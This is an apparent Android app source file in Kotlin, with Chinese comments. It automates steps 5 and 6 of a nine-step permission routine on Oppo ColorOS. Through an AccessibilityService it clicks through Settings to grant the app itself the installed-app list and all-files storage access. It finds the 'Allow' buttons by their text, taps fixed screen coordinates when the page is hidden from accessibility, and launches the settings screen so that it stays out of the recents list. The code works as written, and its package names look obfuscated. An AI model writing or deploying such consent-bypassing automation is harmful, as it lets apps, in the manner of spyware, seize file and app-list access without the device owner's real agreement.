package com.storm.safe.rock.service.modules.yw5xud.oppo

import android.util.Log
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.yw5xud.common.GestureTapHelper
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.delay

/**
 * Step 5 -- 应用列表(ColorOS 独有 QUERY_ALL_PACKAGES)。
 * Step 6 -- 所有文件访问(MANAGE_EXTERNAL_STORAGE)。
 *
 * 两个 step 行数都较少(~57 + ~86),合并为一个 delegate。
 */
class OppoStep56Misc(
    private val service: MyAccessibilityService?,
    private val ui: UiAutomation,
    private val steps: OppoSteps
) {
    companion object {
        private const val TAG = "OppoStep56Misc"
        // ColorOS 16 SubSettings Switch 中心坐标(与 Step4 Overlay 相同位置)
        private const val SUBSETTINGS_SWITCH_X = 1062f
        private const val SUBSETTINGS_SWITCH_Y = 982f
    }

    // ━━━━━━━━━━━━━━━━━ Step 5 -- 应用列表 ━━━━━━━━━━━━━━━━━

    suspend fun executeStep5(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        val ctx = steps.ctx
        if (OppoStepCompletionStore.isCompleted(ctx, OppoStepCompletionStore.Keys.STEP5_APPLIST)) {
            logs.add("[Step 5/9] ⏭ 24h 内已完成,跳过"); return
        }
        val sdk = android.os.Build.VERSION.SDK_INT
        if (sdk < 31) {
            logs.add("[Step 5/9] SDK=$sdk<31 manifest 自动授予,直接 mark")
            successes.add("[Step 5/9] AppList 自动授予")
            OppoStepCompletionStore.markCompleted(ctx, OppoStepCompletionStore.Keys.STEP5_APPLIST); return
        }
        // Phase D: ColorOS 16 把 QUERY_ALL_PACKAGES 作为 manifest normal perm 自动授予,
        //          运行时 PERMISSION_GRANTED 时无需 UI。
        // Call through steps to preserve test override behavior
        if (steps.hasQueryAllPackagesPermission()) {
            logs.add("[Step 5/9] QUERY_ALL_PACKAGES 已 granted,manifest 自动,跳过 UI")
            successes.add("[Step 5/9] AppList 已授予(manifest)")
            OppoStepCompletionStore.markCompleted(ctx, OppoStepCompletionStore.Keys.STEP5_APPLIST); return
        }
        logs.add("[Step 5/9] ▶ 读取应用列表开始(SDK=$sdk)")
        ui.openAppDetails()
        delay(800L)
        // Call through steps to preserve test override behavior
        val ok = steps.tryOpenAppListSwitch(successes, logs)
        if (ok) {
            OppoStepCompletionStore.markCompleted(ctx, OppoStepCompletionStore.Keys.STEP5_APPLIST)
        } else {
            failures.add("[Step 5/9] AppList 开关未点中")
        }
    }

    /** 检测 QUERY_ALL_PACKAGES 是否已授予(manifest 声明 + 系统级授予). */
    fun hasQueryAllPackagesPermission(): Boolean {
        return try {
            val pm = steps.ctx.packageManager ?: return false
            pm.checkPermission("android.permission.QUERY_ALL_PACKAGES", steps.ctx.packageName) ==
                android.content.pm.PackageManager.PERMISSION_GRANTED
        } catch (_: Exception) { false }
    }

    suspend fun tryOpenAppListSwitch(
        successes: MutableList<String>,
        logs: MutableList<String>
    ): Boolean {
        ui.clickSelectorWithScroll("[text*=\"权限管理\"][visibleToUser=true]", scrollLimit = 3) || ui.clickSelectorWithScroll("[text*=\"权限\"][visibleToUser=true]", scrollLimit = 3)
        delay(600L)
        val texts = listOf("读取已安装应用列表", "读取已安装应用", "获取已安装应用", "查看已安装应用", "应用列表")
        for (t in texts) {
            if (ui.clickSelectorWithScroll("[text*=\"$t\"][visibleToUser=true]", scrollLimit = 10)) {
                delay(400L)
                if (ui.clickSelector("[text=\"允许\"][visibleToUser=true]")) { successes.add("[Step 5/9] AppList 允许点中"); return true }
            }
        }
        return false
    }

    // ━━━━━━━━━━━━━━━━━ Step 6 -- 所有文件访问 ━━━━━━━━━━━━━━━━━

    suspend fun executeStep6(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        val ctx = steps.ctx
        if (OppoStepCompletionStore.isCompleted(ctx, OppoStepCompletionStore.Keys.STEP6_FILEACCESS)) {
            logs.add("[Step 6/9] ⏭ 24h 内已完成,跳过"); return
        }
        val sdk = android.os.Build.VERSION.SDK_INT
        if (sdk < 30) { logs.add("[Step 6/9] SDK=$sdk<30 不需要,跳过"); return }
        // Call through steps to preserve test override behavior
        if (steps.isExternalStorageManagerNow()) {
            successes.add("[Step 6/9] 已有 MANAGE_EXTERNAL_STORAGE")
            OppoStepCompletionStore.markCompleted(ctx, OppoStepCompletionStore.Keys.STEP6_FILEACCESS); return
        }
        logs.add("[Step 6/9] ▶ 所有文件访问开始")
        // Call through steps to preserve test override behavior
        steps.launchFileAccessSettings()
        ui.waitForPackage("com.android.settings", 5000L)
        steps.dumpCurrentPage("Step6-before")
        val ok = steps.tryToggleFileAccess(successes, logs)
        if (ok) {
            OppoStepCompletionStore.markCompleted(ctx, OppoStepCompletionStore.Keys.STEP6_FILEACCESS)
        } else {
            failures.add("[Step 6/9] 所有文件访问未开启")
        }
    }

    fun isExternalStorageManagerNow(): Boolean {
        return ui.isExternalStorageManager()
    }

    suspend fun launchFileAccessSettings() {
        try {
            val ctx = steps.ctx
            val i = android.content.Intent(android.provider.Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                .setData(android.net.Uri.parse("package:${ctx.packageName}"))
                .addFlags(
                    android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
                    android.content.Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED or
                    android.content.Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
                )
            ctx.startActivity(i)
        } catch (e: CancellationException) { throw e } catch (e: Exception) {
            android.util.Log.w(TAG, "launchFileAccessSettings: ${e.message}")
        }
    }

    suspend fun tryToggleFileAccess(
        successes: MutableList<String>,
        logs: MutableList<String>
    ): Boolean {
        // ColorOS 16 SubSettings 内容对 AccessibilityService 不可见,
        // 先尝试常规方式,失败后坐标点击
        delay(1500L)

        val byId = ui.toggleSwitch("[vid=\"android:id/switch_widget\"][visibleToUser=true]", true)
        Log.d(TAG, "[Step6] toggleSwitch(switch_widget)=$byId")
        var toggled = byId

        if (!toggled) {
            for (s in listOf("授予所有文件的管理权限", "所有文件访问权限", "允许访问所有文件")) {
                if (ui.openSwitch(s)) { toggled = true; break }
            }
        }

        if (!toggled) {
            // 坐标点击 Switch(真机 dump: 与悬浮窗页面相同位置)
            Log.d(TAG, "[Step6] AccessibilityService 不可见,坐标点击 Switch")
            toggled = tapAtCoordinate(SUBSETTINGS_SWITCH_X, SUBSETTINGS_SWITCH_Y)
            Log.d(TAG, "[Step6] tapAtCoordinate=$toggled")
        }
        if (!toggled) return false
        delay(800L)
        val sdk = android.os.Build.VERSION.SDK_INT
        when {
            sdk in 29..31 -> listOf("确定", "OK", "允许", "Allow", "我知道了", "Got it").any { ui.clickSelector("[text=\"$it\"][visibleToUser=true]") }
            sdk == 32 -> listOf("确定", "应用", "允许").any { ui.clickSelector("[text=\"$it\"][visibleToUser=true]") }
            sdk == 33 -> { ui.clickSelector("[text=\"确定\"][visibleToUser=true]"); delay(400L); ui.clickSelector("[text=\"允许\"][visibleToUser=true]") }
            sdk >= 34 -> listOf("允许", "授予权限", "确定").any { ui.clickSelector("[text=\"$it\"][visibleToUser=true]") }
            else -> ui.clickSelector("[text=\"确定\"][visibleToUser=true]")
        }
        delay(800L)
        val granted = steps.isExternalStorageManagerNow()
        if (granted) successes.add("[Step 6/9] MANAGE_EXTERNAL_STORAGE 已获取")
        return granted
    }

    /** dispatchGesture 坐标点击(委托 GestureTapHelper) */
    private suspend fun tapAtCoordinate(x: Float, y: Float): Boolean {
        val svc = service ?: return false
        return GestureTapHelper.performTap(svc, x, y, 100L)
    }
}
